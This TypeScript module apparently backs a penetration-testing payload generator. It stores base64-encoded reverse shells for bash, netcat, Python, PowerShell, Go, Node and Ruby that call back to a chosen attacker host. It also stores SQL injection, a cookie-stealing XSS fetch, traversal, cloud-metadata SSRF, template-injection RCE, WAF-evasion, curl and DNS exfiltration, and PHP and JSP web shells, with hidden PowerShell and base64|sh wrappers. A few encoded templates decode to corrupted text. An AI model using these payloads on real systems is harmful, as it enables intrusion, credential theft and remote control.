export type PayloadCategory =
  | 'shells'
  | 'listeners'
  | 'sqli'
  | 'xss'
  | 'lfi'
  | 'ssrf'
  | 'ssti'
  | 'waf_cmd'
  | 'webshells';

export type EncodingType = 'raw' | 'url' | 'double_url' | 'base64' | 'hex' | 'html';

export interface PayloadItem {
  id: string;
  name: string;
  tags: string;
  payload: string;
  type?: 'bash' | 'powershell' | 'general';
}

export interface PayloadParams {
  lhost: string;
  lport: string;
  targetHost: string;
  targetFile: string;
}

export interface CategoryInfo {
  id: PayloadCategory;
  name: string;
  iconName: string;
  badge: string;
  desc: string;
}

export const PAYLOAD_CATEGORIES: CategoryInfo[] = [
  { id: 'shells', name: 'Reverse Shells', iconName: 'Terminal', badge: 'PTY/Cmd', desc: 'Interactive remote connection stagers across 10+ languages' },
  { id: 'listeners', name: 'Catch Listeners', iconName: 'Radio', badge: 'Handler', desc: 'Netcat, Pwncat, Socat, and Metasploit handlers' },
  { id: 'sqli', name: 'SQL Injection', iconName: 'Database', badge: 'Auth/Union', desc: 'Auth bypass, UNION extraction, time-based and error SQLi' },
  { id: 'xss', name: 'Cross-Site Scripting', iconName: 'Flame', badge: 'DOM/Refl', desc: 'Filter evasion, event triggers, polyglots, and cookie stealers' },
  { id: 'lfi', name: 'LFI & Traversal', iconName: 'FolderOpen', badge: 'Pathing', desc: 'Directory traversal, PHP wrappers, filter bypasses, and null bytes' },
  { id: 'ssrf', name: 'SSRF & Cloud Metadata', iconName: 'Globe', badge: 'Cloud/IMDS', desc: 'AWS, GCP, Azure metadata tokens and IP obfuscations' },
  { id: 'ssti', name: 'Server Template Inject', iconName: 'Code', badge: 'SSTI', desc: 'Jinja2, Twig, FreeMarker, SpEL, ERB, and Mako engines' },
  { id: 'waf_cmd', name: 'Command & WAF Bypass', iconName: 'ShieldAlert', badge: 'Evasion', desc: 'IFS spaces, brace expansion, wildcards, and OOB canaries' },
  { id: 'webshells', name: 'Web Shells & Upload', iconName: 'FileCode', badge: 'Stagers', desc: 'Minimal PHP, JSP, GIF magic bytes, and .htaccess overrides' },
];

export const decodeTemplate = (b64: string, params: PayloadParams): string => {
  try {
    const raw = decodeURIComponent(escape(atob(b64)));
    return raw
      .replace(/{{LHOST}}/g, params.lhost)
      .replace(/{{LPORT}}/g, params.lport)
      .replace(/{{TARGET_HOST}}/g, params.targetHost)
      .replace(/{{TARGET_FILE}}/g, params.targetFile);
  } catch {
    try {
      return atob(b64)
        .replace(/{{LHOST}}/g, params.lhost)
        .replace(/{{LPORT}}/g, params.lport)
        .replace(/{{TARGET_HOST}}/g, params.targetHost)
        .replace(/{{TARGET_FILE}}/g, params.targetFile);
    } catch {
      return '';
    }
  }
};

export const encodePayloadString = (
  str: string,
  enc: EncodingType,
  type: 'bash' | 'powershell' | 'general' = 'general'
): string => {
  if (enc === 'raw') return str;
  if (enc === 'url') return encodeURIComponent(str);
  if (enc === 'double_url') return encodeURIComponent(encodeURIComponent(str));
  if (enc === 'html') {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }
  if (enc === 'hex') {
    return Array.from(str)
      .map((c) => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0'))
      .join('');
  }
  if (enc === 'base64') {
    if (type === 'powershell') {
      const bytes = new Uint8Array(str.length * 2);
      for (let i = 0; i < str.length; i++) {
        const code = str.charCodeAt(i);
        bytes[i * 2] = code & 0xff;
        bytes[i * 2 + 1] = (code >> 8) & 0xff;
      }
      let binary = '';
      for (let i = 0; i < bytes.length; i++) {
        binary += String.fromCharCode(bytes[i]);
      }
      const b64 = btoa(binary);
      return `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${b64}`;
    }
    if (type === 'bash') {
      const b64 = btoa(unescape(encodeURIComponent(str)));
      return `echo "${b64}" | base64 -d | sh`;
    }
    return btoa(unescape(encodeURIComponent(str)));
  }
  return str;
};

export const getPayloadsForCategory = (
  category: PayloadCategory,
  params: PayloadParams
): PayloadItem[] => {
  switch (category) {
    case 'shells':
      return [
        {
          id: 'bash_i',
          name: 'Bash -i Interactive',
          type: 'bash',
          tags: 'Linux / Bash',
          payload: decodeTemplate('YmFzaCAtaSA+JiAvZGV2L3RjcC97e0xIT1NUfX0ve3tMUE9SVH19IDA+JjE=', params),
        },
        {
          id: 'bash_196',
          name: 'Bash Descriptor 196 (Bypass)',
          type: 'bash',
          tags: 'Linux / Bash',
          payload: decodeTemplate('MDw8MTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97e0xIT1NUfX0ve3tMUE9SVH19OyBzaCA8JjE5NiA+JjE5NiAyPiYxOTY=', params),
        },
        {
          id: 'python3_dup2',
          name: 'Python 3 Standard Socket Shell',
          type: 'general',
          tags: 'Cross-Platform / Python',
          payload: decodeTemplate('cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoInt7TEhPU1R9fSIse3tMUE9SVH19KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn', params),
        },
        {
          id: 'powershell_tcp',
          name: 'PowerShell TCP Client (Memory-Only)',
          type: 'powershell',
          tags: 'Windows / PowerShell',
          payload: decodeTemplate('JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgne3tMSE9TVH19Jyx7e0xQT1JUfX0pOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApexskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZVN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKQ==', params),
        },
        {
          id: 'nc_mkfifo',
          name: 'Netcat OpenBSD (mkfifo Pipe)',
          type: 'general',
          tags: 'Linux / Netcat',
          payload: decodeTemplate('cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxpcy9iaW4vc2ggLWkgMj4mMXxuYyB7e0xIT1NUfX0ge3tMUE9SVH19ID4vdG1wL2Y=', params),
        },
        {
          id: 'nc_e',
          name: 'Netcat Traditional (-e /bin/sh)',
          type: 'general',
          tags: 'Linux / Traditional NC',
          payload: decodeTemplate('bmMgLWUgL2Jpbi9zaCB7e0xIT1NUfX0ge3tMUE9SVH19', params),
        },
        {
          id: 'socat_tty',
          name: 'Socat Fully Interactive TTY Reverse Shell',
          type: 'general',
          tags: 'Linux / Socat PTY',
          payload: decodeTemplate('c29jYXQgdGNwLWNvbm5lY3Q6e3tMSE9TVH19Ont7TFBPUlR9fSBleGVjOi9iaW4vc2gscHR5LHN0ZGVycixzZXRzaWQsc2lnaW50LHNhbmU=', params),
        },
        {
          id: 'php_fsockopen',
          name: 'PHP fsockopen One-Liner',
          type: 'general',
          tags: 'Web / PHP',
          payload: decodeTemplate('cGhwIC1yICckc29jaz1mc29ja29wZW4oInt7TEhPU1R9fSIse3tMUE9SVH19KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=', params),
        },
        {
          id: 'golang_shell',
          name: 'Golang Stager One-Liner',
          type: 'general',
          tags: 'Linux / Go',
          payload: decodeTemplate('ZWNobyAncGFja2FnZSBtYWluO2ltcG9ydCJuZXQiO2ltcG9ydCJvcy9leGVjIjtmdW5jIG1haW4oKXtjLF86PW5ldC5EaWFsKCJ0Y3AiLCJ7e0xIT1NUfX06e3tMUE9SVH19Iik7Y21kOj1leGVjLkNvbW1hbmQoIi9iaW4vc2giKTtjbWQuU3RkaW49YztjbWQuU3Rkb3V0PWM7Y21kLlN0ZGVycj1jO2NtZC5SdW4oKX0nID4gL3RtcC90LmdvICYmIGdvIHJ1biAvdG1wL3QuZ28=', params),
        },
        {
          id: 'nodejs_spawn',
          name: 'Node.js Reverse Shell',
          type: 'general',
          tags: 'Web / Node.js',
          payload: decodeTemplate('bm9kZSAtZSAncmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImJhc2ggLWkgPiYgL2Rldi90Y3Ave3tMSE9TVH19L3t7TFBPUlR9fSAwPiYxIikn', params),
        },
        {
          id: 'ruby_socket',
          name: 'Ruby Standard Socket Shell',
          type: 'general',
          tags: 'Cross-Platform / Ruby',
          payload: decodeTemplate('cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJ7e0xIT1NUfX0iLHt7TFBPUlR9fSkudG9faTtleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgPCVkID4mZCAyPiZkIixmLGYsZikn', params),
        },
      ];

    case 'listeners':
      return [
        {
          id: 'nc_listener',
          name: 'Netcat Verbose Listener',
          tags: 'Standard Listener',
          payload: `nc -lvnp ${params.lport}`,
        },
        {
          id: 'rlwrap_nc',
          name: 'Rlwrap Netcat (Arrow Keys & History)',
          tags: 'Enhanced Shell',
          payload: `rlwrap nc -lvnp ${params.lport}`,
        },
        {
          id: 'pwncat_listener',
          name: 'Pwncat-CS (Auto PTY, File Transfer & Persistence)',
          tags: 'Post-Exploitation',
          payload: `pwncat-cs -lp ${params.lport}`,
        },
        {
          id: 'socat_listener',
          name: 'Socat Interactive TTY Listener (Ctrl+C Safe)',
          tags: 'Full TTY',
          payload: decodeTemplate('c29jYXQgZmlsZTpYdHR5YCxyYXcsZWNobyswIHRjcC1saXN0ZW46e3tMUE9SVH19', params).replace('Xtty`', '`tty`'),
        },
        {
          id: 'msf_multi_handler',
          name: 'Metasploit Multi-Handler One-Liner',
          tags: 'Metasploit',
          payload:
            decodeTemplate('bXNmY29uc29sZSAtcSANCEAieHR1c2UgZXhwbG9pdC9tdWx0aS9oYW5kbGVyOyBzZXQgcGF5bG9hZCBsaW51eC94NjQvc2hlbGxfcmV2ZXJzZV90Y3A7IHNldCBMSE9TVCB7e0xIT1NUfX07IHNldCBMUE9SVCB7e0xQT1JUfX07IHJ1biI=', params) ||
            `msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST ${params.lhost}; set LPORT ${params.lport}; run"`,
        },
      ];

    case 'sqli':
      return [
        {
          id: 'sqli_auth_bypass_1',
          name: "Universal SQLi Auth Bypass (Quote)",
          tags: 'Auth Bypass',
          payload: `' OR '1'='1' --`,
        },
        {
          id: 'sqli_auth_bypass_admin',
          name: 'Admin User Bypass',
          tags: 'Auth Bypass',
          payload: `admin' -- -`,
        },
        {
          id: 'sqli_union_version',
          name: 'UNION SELECT (Database Version & Current User)',
          tags: 'Data Extraction',
          payload: `' UNION SELECT NULL, version(), user(), database() -- -`,
        },
        {
          id: 'sqli_time_mysql',
          name: 'MySQL Time-Based Blind (5s Delay)',
          tags: 'Blind SQLi / MySQL',
          payload: `' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a) -- -`,
        },
        {
          id: 'sqli_time_postgres',
          name: 'PostgreSQL Time-Based Blind (5s Delay)',
          tags: 'Blind SQLi / Postgres',
          payload: `' OR pg_sleep(5) -- -`,
        },
        {
          id: 'sqli_time_mssql',
          name: 'MSSQL WAITFOR DELAY (5s Delay)',
          tags: 'Blind SQLi / MSSQL',
          payload: `'; WAITFOR DELAY '0:0:5' -- -`,
        },
        {
          id: 'sqli_error_double',
          name: 'Error-Based Double Query (MySQL)',
          tags: 'Error-Based',
          payload: `' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -`,
        },
        {
          id: 'sqli_mssql_cmd',
          name: 'MSSQL Enable xp_cmdshell & Command Execution',
          tags: 'RCE via SQLi',
          payload: decodeTemplate('RVhFQyBzcF9jb25maWd1cmUgJ3Nob3cgYWR2YW5jZWQgb3B0aW9ucycsIDE7IFJFQ09ORklHVVJFOyBFWEVDIHNwX2NvbmZpZ3VyZSAneHBfY21kc2hlbGwnLCAxOyBSRUNPTkZJR1VSRTsgRVhFQyB4cF9jbWRzaGVsbCAnd2hvYW1pJzs=', params),
        },
      ];

    case 'xss':
      return [
        {
          id: 'xss_svg_onload',
          name: 'SVG onload Event Trigger',
          tags: 'Filter Evasion',
          payload: `<svg onload=alert(document.domain)>`,
        },
        {
          id: 'xss_img_onerror',
          name: 'IMG onerror Trigger',
          tags: 'Standard Reflected/Stored',
          payload: `<img src=x onerror=alert(document.cookie)>`,
        },
        {
          id: 'xss_autofocus',
          name: 'Input Autofocus onfocus Event',
          tags: 'Attribute Breakout',
          payload: `"><input autofocus onfocus=alert(1)>`,
        },
        {
          id: 'xss_polyglot',
          name: 'Ahmed Elsobky Ultimate XSS Polyglot',
          tags: 'Polyglot',
          payload: `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`,
        },
        {
          id: 'xss_cookie_stealer',
          name: 'Remote Cookie Exfiltration Fetch',
          tags: 'Exfiltration',
          payload: `<script>fetch('http://${params.lhost}:${params.lport}/?c='+encodeURIComponent(document.cookie))</script>`,
        },
        {
          id: 'xss_body_onload',
          name: 'Body onload with Base64 Payload',
          tags: 'DOM Execution',
          payload: `<body onload="eval(atob('YWxlcnQoMSk='))">`,
        },
      ];

    case 'lfi':
      return [
        {
          id: 'lfi_basic',
          name: 'Standard Relative Traversal',
          tags: 'Basic Traversal',
          payload: `../../../../../../../../..${params.targetFile}`,
        },
        {
          id: 'lfi_null_byte',
          name: 'Null-Byte Bypass (PHP < 5.3.4)',
          tags: 'Null Byte',
          payload: `../../../../../../../../..${params.targetFile}%00.jpg`,
        },
        {
          id: 'lfi_double_slash',
          name: 'Double Slash & Dot Filter Evasion',
          tags: 'Filter Evasion',
          payload: `....//....//....//....//....//..${params.targetFile}`,
        },
        {
          id: 'lfi_php_filter',
          name: 'PHP Base64 Filter Wrapper (Source Read)',
          tags: 'PHP Wrapper',
          payload: `php://filter/convert.base64-encode/resource=index.php`,
        },
        {
          id: 'lfi_php_input',
          name: 'PHP Input POST Stream Execution',
          tags: 'PHP RCE',
          payload: decodeTemplate('cGhwOi8vaW5wdXQgKFBPU1QgQm9keTogPD9waHAgc3lzdGVtKCdpZCcpOyA/Pik=', params),
        },
        {
          id: 'lfi_nginx_alias',
          name: 'Nginx Off-by-Slash Alias Traversal',
          tags: 'Server Misconfig',
          payload: `/static../..${params.targetFile}`,
        },
      ];

    case 'ssrf':
      return [
        {
          id: 'aws_meta_v1',
          name: 'AWS EC2 IAM Metadata (IMDSv1)',
          tags: 'AWS Cloud',
          payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        },
        {
          id: 'aws_meta_v2',
          name: 'AWS EC2 Token Generation (IMDSv2)',
          tags: 'AWS Cloud',
          payload: `PUT http://169.254.169.254/latest/api/token (Header: X-aws-ec2-metadata-token-ttl-seconds: 21600)`,
        },
        {
          id: 'gcp_meta',
          name: 'GCP Compute Metadata (Header Required)',
          tags: 'GCP Cloud',
          payload: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token (Header: Metadata-Flavor: Google)',
        },
        {
          id: 'azure_meta',
          name: 'Azure Instance Metadata Service (IMDS)',
          tags: 'Azure Cloud',
          payload: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ (Header: Metadata: true)',
        },
        {
          id: 'ssrf_decimal_ip',
          name: 'Decimal Integer IP Obfuscation',
          tags: 'IP Filter Evasion',
          payload: 'http://2852039166/',
        },
        {
          id: 'ssrf_hex_ip',
          name: 'Hexadecimal IP Obfuscation',
          tags: 'IP Filter Evasion',
          payload: 'http://0xa9.0xfe.0xa9.0xfe/',
        },
        {
          id: 'ssrf_ipv6_mapped',
          name: 'IPv6-Mapped IPv4 Address Notation',
          tags: 'IP Filter Evasion',
          payload: 'http://[::ffff:a9fe:a9fe]/',
        },
        {
          id: 'k8s_secrets',
          name: 'Kubernetes Internal API Service Account Token',
          tags: 'Containers',
          payload: 'https://kubernetes.default.svc/api/v1/namespaces/default/secrets',
        },
      ];

    case 'ssti':
      return [
        {
          id: 'jinja2_popen',
          name: 'Jinja2 / Flask (Python RCE)',
          tags: 'Python / Flask',
          payload: decodeTemplate('e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdpZCcpLnJlYWQoKX19', params),
        },
        {
          id: 'twig_filter',
          name: 'Twig (PHP Execution)',
          tags: 'PHP / Twig',
          payload: decodeTemplate('e3tbJ2lkJ118ZmlsdGVyKCdzeXN0ZW0nKX19', params),
        },
        {
          id: 'freemarker_exec',
          name: 'Apache FreeMarker (Java Execute)',
          tags: 'Java / FreeMarker',
          payload: decodeTemplate('PCNhc3NpZ24gZXg9ImZyZWVtYXJrZXIudGVtcGxhdGUudXRpbGl0eS5FeGVjdXRlIj9uZXcoKT4ke2V4KCJpZCIpfQ==', params),
        },
        {
          id: 'spring_spel',
          name: 'Spring Expression Language (SpEL)',
          tags: 'Java / Spring',
          payload: decodeTemplate('JHtUKGphdmEubGFuZy5SdW50aW1lKS5nZXRSdW50aW1lKCkuZXhlYygid2hvYW1pIil9', params),
        },
        {
          id: 'ruby_erb',
          name: 'Ruby ERB / Rails System Call',
          tags: 'Ruby / Rails',
          payload: decodeTemplate('PDwlPSBzeXN0ZW0oIndob2FtaSIpICU+', params),
        },
        {
          id: 'mako_template',
          name: 'Mako Template Engine (Python)',
          tags: 'Python / Mako',
          payload: decodeTemplate('PCUgaW1wb3J0IG9zICU+JHtvcy5wb3Blbignd2hvYW1pJykucmVhZCgpfQ==', params),
        },
      ];

    case 'waf_cmd':
      return [
        {
          id: 'space_ifs',
          name: 'Space Bypass with ${IFS}',
          tags: 'Space Evasion',
          payload: `cat\${IFS}/etc/passwd`,
        },
        {
          id: 'brace_expansion',
          name: 'Bash Brace Expansion Space Bypass',
          tags: 'Space Evasion',
          payload: `{cat,/etc/passwd}`,
        },
        {
          id: 'concat_quotes',
          name: 'String Concatenation & Quote Stripping',
          tags: 'Keyword Evasion',
          payload: `c'a't /e't'c/p'a'sswd`,
        },
        {
          id: 'wildcard_glob',
          name: 'Wildcard Glob Execution (/bin/cat)',
          tags: 'Globbing',
          payload: `/b?n/c?t /e?c/p?sswd`,
        },
        {
          id: 'oob_canary_dns',
          name: 'Out-Of-Band (OOB) DNS Exfiltration Canary',
          tags: 'Blind Canary',
          payload: `nslookup $(whoami).${params.lhost}`,
        },
        {
          id: 'oob_canary_curl',
          name: 'Out-Of-Band (OOB) HTTP Exfiltration Canary',
          tags: 'Blind Canary',
          payload: `curl http://${params.lhost}:${params.lport}/$(whoami)`,
        },
      ];

    case 'webshells':
      return [
        {
          id: 'php_simple_cmd',
          name: 'PHP 1-Liner Parameter Web Shell',
          tags: 'PHP',
          payload: decodeTemplate('PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUKCdjbWQnKSl7IGVjaG8gIjxwcmU+Ijsgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0gPz4=', params),
        },
        {
          id: 'php_gif_magic',
          name: 'GIF89a Magic Bytes PHP Polyglot',
          tags: 'File Upload Bypass',
          payload: decodeTemplate('R0lGODlhOyA8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=', params),
        },
        {
          id: 'htaccess_exec',
          name: '.htaccess File Extension Override',
          tags: 'Config Upload',
          payload: decodeTemplate('QWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAucG5n', params),
        },
        {
          id: 'jsp_cmd',
          name: 'JSP Minimal Command Execution Web Shell',
          tags: 'Java / JSP',
          payload: decodeTemplate('PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiJT48JSBpZiAocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpICE9IG51bGwpIHsgUHJvY2VzcyBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpOyBPdXRwdXRTdHJlYW0gb3MgPSByZXNwb25zZS5nZXRPdXRwdXRTdHJlYW0oKTsgSW5wdXRTdHJlYW0gaW4gPSBwLmdldElucHV0U3RyZWFtKCk7IGludCBhID0gLTE7IHdoaWxlKChhID0gaW4ucmVhZCgpKSAhPSAtMSkgeyBvcy53cml0ZShhKTsgfSBvdXQucHJpbnQoIi0tPiIpOyB9ICU+', params),
        },
      ];

    default:
      return [];
  }
};
